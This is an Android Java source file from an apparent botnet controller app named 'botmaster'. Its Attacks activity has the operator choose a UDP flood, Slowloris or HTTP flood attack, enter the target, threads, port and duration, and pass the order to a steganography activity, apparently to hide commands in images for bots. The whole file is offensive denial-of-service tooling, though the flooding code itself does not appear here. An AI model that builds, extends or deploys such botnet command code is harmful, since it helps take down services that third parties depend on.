package com.example.botmaster;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import com.example.botmaster.steganography.Steganography;

import java.io.Serializable;


public class Attacks extends AppCompatActivity implements AdapterView.OnItemSelectedListener, Serializable
{
    private ArrayAdapter<String> adapter;
    private Button button,attacks;
    private ViewGroup inclusionViewGroup;
    private String Starget, attackType;
    private int sthreads,sport,stimer;
    private static Context appContext;
    private AttackInfo attackInfo;
    private EditText text;
    private EditText threads;
    private EditText port;
    private EditText timer;
    private View child1;


    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attacks);
        appContext = getApplicationContext();

        button = (Button) findViewById(R.id.battacks);
        Spinner dropdown = findViewById(R.id.spinner1);
        String[] items = new String[]{"UDP Flood Attack", "SlowLoris Attack", "HTTP Flood Attack"};
        adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, items);
        dropdown.setAdapter(adapter);
        dropdown.setOnItemSelectedListener(this);

        inclusionViewGroup = (ViewGroup)findViewById(R.id.inclusionlayout);
    }

    public static Context getAppContext() {
        return appContext;
    }

    @Override
    public void onItemSelected(AdapterView<?> parent, View view, int position, long id)
    {
        String attack=null;

        inclusionViewGroup.removeAllViews();
        inclusionViewGroup.refreshDrawableState();

        if(position==0)
        {
            System.out.println("UDP");
            attack="UDP";

            child1 = null;
            child1 = LayoutInflater.from(this).inflate(R.layout.activity_udp, null);
            inclusionViewGroup.addView(child1);
            text=(EditText)child1.findViewById(R.id.UDPtarget);
            threads=(EditText)child1.findViewById(R.id.UDPthreads);
            timer = (EditText)child1.findViewById(R.id.UDPminutes);
        }
        else if(position==1)
        {
            System.out.println("SlowLoris");
            attack="SlowLoris";
            child1=null;
            child1 = LayoutInflater.from(this).inflate(R.layout.activity_slowloris, null);
            inclusionViewGroup.addView(child1);
            text=(EditText)child1.findViewById(R.id.SLOWtarget);
            threads=(EditText)child1.findViewById(R.id.Slowthreads);
            timer=(EditText)child1.findViewById(R.id.SlowTime);
            port=(EditText)child1.findViewById(R.id.SlowPort);
        }
        else if(position==2)
        {

            System.out.println("HTTP");
            attack="HTTP";

            child1=null;
            child1 = LayoutInflater.from(this).inflate(R.layout.activity_http, null);

            inclusionViewGroup.addView(child1);
            text=(EditText)child1.findViewById(R.id.HTTPtarget);
            threads=(EditText)child1.findViewById(R.id.HTTPthreads);
            timer = (EditText)child1.findViewById(R.id.HTTPminutes);
        }
        connector(attack);
    }

    public void connector(String attack)
    {
        final String str=attack;
        button.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v)
            {
                Log.e("Connector",str);

                if(str.equals("UDP"))
                {
                    attackType = "UDP";
                    Starget = text.getText().toString();
                    String threadsString = threads.getText().toString();
                    sthreads = new Integer(threadsString).intValue();
                    String timerString = timer.getText().toString();
                    stimer = new Integer(timerString).intValue();
                    text.setText(null);
                    threads.setText(null);
                    timer.setText(null);
                    attackInfo = new AttackInfo(attackType,Starget,sthreads,stimer);
                }
                else if(str.equals("SlowLoris"))
                {
                    attackType = "SlowLoris";
                    Starget = text.getText().toString();
                    String threadsString = threads.getText().toString();
                    sthreads = new Integer(threadsString).intValue();
                    String portString = port.getText().toString();
                    sport = new Integer(portString).intValue();
                    String timerString = timer.getText().toString();
                    stimer = new Integer(timerString).intValue();
                    text.setText(null);
                    threads.setText(null);
                    port.setText(null);
                    timer.setText(null);
                    attackInfo = new AttackInfo(Starget,attackType,sthreads,sport,stimer);
                }
                else if(str.equals("HTTP"))
                {
                    attackType = "HTTP";
                    Starget = text.getText().toString();
                    String threadsString = threads.getText().toString();
                    sthreads = new Integer(threadsString).intValue();
                    String timerString = timer.getText().toString();
                    stimer = new Integer(timerString).intValue();
                    text.setText(null);
                    threads.setText(null);
                    timer.setText(null);
                    attackInfo = new AttackInfo(attackType, Starget, sthreads, stimer);
                }
                Intent intent=new Intent(Attacks.this, Steganography.class);
                intent.putExtra("Attack",attackInfo);
                startActivity(intent);
            }
        });

        }


    @Override
    public void onNothingSelected(AdapterView<?> parent) {

    }
}
